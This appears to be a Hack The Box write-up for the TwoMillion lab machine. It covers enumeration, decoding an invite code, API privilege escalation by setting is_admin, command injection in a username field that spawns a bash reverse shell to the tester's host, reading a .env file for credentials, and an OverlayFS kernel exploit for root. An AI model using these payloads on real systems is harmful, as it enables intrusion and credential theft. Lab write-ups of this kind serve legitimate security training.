# HTB - TwoMillion

**IP Address:** `10.10.11.221`  
**OS:** Ubuntu  
**Difficulty:** Medium  
**Tags:** #Web, #ROT13, #Base64, #CookieInjection, #CommandInjection, #ReverseShell, #OverlayFS

---

## 1. Initial Enumeration

### 1.1 Ping

```bash
ping -c 1 10.10.11.221
```

✅ Host is alive

### 1.2 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.11.221
nmap -sC -sV -p22,80 10.10.11.221 -oN targeted
```

Found:

- 22/tcp → SSH
- 80/tcp → Apache/2.4.52 (Werkzeug 3.0.3 Python/3.10.12)

---

## 2. Web Enumeration

Added to `/etc/hosts`:

```
10.10.11.221 2million.htb
```

Website is a clone of the original HTB interface from 2017. Registration requires hacking the invite system.

---

## 3. Decoding the Invite Logic

On the invite page, ran in browser console:

```js
makeInviteCode()
```

Found ROT13 encoded string. Decoded via terminal:

```bash
echo "ROT13_STRING" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

Result:

```
Make a POST request to /api/v1/invite/generate
```

Sent the POST request:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

Decoded the Base64 invite key:

```bash
echo "M0VKMFUtUklFUVEtRVZDVEEtNzFIWFc=" | base64 -d
```

Used the invite key to register and access the site.

---

## 4. API Fuzzing

Tested endpoints with:

```bash
curl -s -X GET "http://2million.htb/api/v1" -v
```

Initially returned 401 Unauthorized. Tried again with session cookie:

```bash
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=<cookie>" | jq
```

Endpoints discovered:

- `/api/v1/user/vpn/generate`
- `/api/v1/admin/auth`
- `/api/v1/admin/vpn/generate`

---

## 5. Privilege Escalation via API Abuse

Tried PUT method to elevate to admin:

```bash
curl -X PUT http://2million.htb/api/v1/user/settings -H "Cookie: PHPSESSID=<cookie>" -H "Content-Type: application/json" -d '{"email":"admin@htb.local","is_admin":1}'
```

✅ Became admin

---

## 6. Command Injection & Shell Access

Tested command injection via `username` field:

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=<cookie>" -H "Content-Type: application/json" -d '{"username": "moka; id #"}'
```

✅ Confirmed command injection

Spawned reverse shell:

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=<cookie>" -H "Content-Type: application/json" -d '{"username": "moka; bash -c \"bash -i >& /dev/tcp/10.10.14.228/443 0>&1\";"}'
```

Listener:

```bash
nc -nlvp 443
```

---

## 7. Post Exploitation

Stabilized shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Found `.env` file with admin credentials.

Logged in as `admin`.

🏁 **User flag obtained**

---

## 8. Root Privilege Escalation via OverlayFS

Checked user-owned files:

```bash
find / -user admin 2>/dev/null | grep -vE "sys|proc"
```

Found mail:

```bash
cat /var/mail/admin
```

Mentioned vulnerability: OverlayFS + FUSE

---

## 9. Exploit OverlayFS

1. Downloaded exploit from GitHub
2. Transferred via HTTP server:
   ```bash
   python3 -m http.server 80
   wget http://10.10.14.228/exploit.zip
   ```
3. Extracted & compiled:
   ```bash
   unzip exploit.zip
   make all
   ```
4. Reconnected as `admin` via SSH and executed:
   ```bash
   ./exp
   ```

✅ Root access obtained  
🏁 **Root flag retrieved**

---

# ✅ MACHINE COMPLETE
